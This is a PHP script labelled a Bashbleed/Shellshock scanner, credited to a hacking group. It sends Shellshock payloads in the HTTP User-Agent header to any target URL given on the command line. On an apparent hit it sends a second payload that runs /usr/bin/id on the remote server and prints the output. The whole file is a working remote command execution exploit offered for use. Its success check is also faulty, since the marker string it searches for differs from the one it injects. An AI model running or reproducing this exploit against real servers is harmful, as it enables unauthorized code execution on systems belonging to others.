<?php
	error_reporting(E_ALL ^ E_NOTICE);
	/*

		==[ Bashbleed / Shellshock - Scanner ]==		


	███╗   ██╗███████╗██╗    ██╗       ██████╗██████╗ ███████╗██╗    ██╗
	████╗  ██║██╔════╝██║    ██║      ██╔════╝██╔══██╗██╔════╝██║    ██║
	██╔██╗ ██║█████╗  ██║ █╗ ██║█████╗██║     ██████╔╝█████╗  ██║ █╗ ██║
	██║╚██╗██║██╔══╝  ██║███╗██║╚════╝██║     ██╔══██╗██╔══╝  ██║███╗██║
	██║ ╚████║███████╗╚███╔███╔╝      ╚██████╗██║  ██║███████╗╚███╔███╔╝
	╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝        ╚═════╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ .net
		[ Written by Rasputin ~ visit new-crew.net]
		
		Usage: php5 <scriptname>.php <target>
		
		Example:
		$ php5 bashbleed_scanner.php vulnsite.vuln
		[*] Bashbleed FOUND !!!
		[*] uid=33(www-data) gid=33(www-data) groups=33(www-data)
		[*] The server responded: 500 Internal Server Error
		$

	*/





		$ch = curl_init(); // create cURL handle (ch)
		if (!$ch) {
			die("[!] Couldn't initialize a cURL handle");
		}
		if( $argv[1] ){
			// set some cURL options
			$ret = curl_setopt($ch, CURLOPT_URL,            "$argv[1]");
			$ret = curl_setopt($ch, CURLOPT_HEADER,         0);
			$ret = curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			$ret = curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$ret = curl_setopt($ch, CURLOPT_USERAGENT, 	"() { foo;};echo R4spu71n");
			$ret = curl_setopt($ch, CURLOPT_TIMEOUT,        30);
			if (substr(strtolower(trim($argv[1])), 0, 5)=='https') { 
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
			}
			// execute
			$ret = curl_exec($ch);

			if (empty($ret)) {
				// some kind of an error happened
				die("[!] " . curl_error($ch)."\n");
				curl_close($ch); // close cURL handler
			} else {
				$info = curl_getinfo($ch);
				curl_close($ch); // close cURL handler
				if (empty($info['http_code'])) {
					die("No HTTP code was returned"); 
				} else {
					// load the HTTP codes
					$pos = strpos($ret, "R4sp7in");
					if( ($pos) || ($info['http_code'] == "500") ) {
						echo "[*] Bashbleed FOUND !!!\n";
						$ch2 = curl_init();
						$ret2 = curl_setopt($ch2, CURLOPT_URL,            "$argv[1]");
						$ret2 = curl_setopt($ch2, CURLOPT_HEADER,         0);
						$ret2 = curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
						$ret2 = curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
						$ret2 = curl_setopt($ch2, CURLOPT_USERAGENT,      "() { foo;};echo;/usr/bin/id");
						$ret2 = curl_setopt($ch2, CURLOPT_TIMEOUT,        30);
						if (substr(strtolower(trim($argv[1])), 0, 5)=='https') { 
							curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false); 
						}
						$ret2 = curl_exec($ch2);
						echo "[*] " . $ret2;
						curl_close($ch2); // close cURL handler
					}
					else
						echo "[!] No Vulnerabilities Found\n";
						// echo results
					echo "[*] The server responded: ";
					echo $info['http_code'] . "\n";
	    
				}

			}
		}
		else {
			echo "Target-URL?\n";
			echo "Usage: " . $argv[0] . " <Target-URL>\n";
		}
	?>
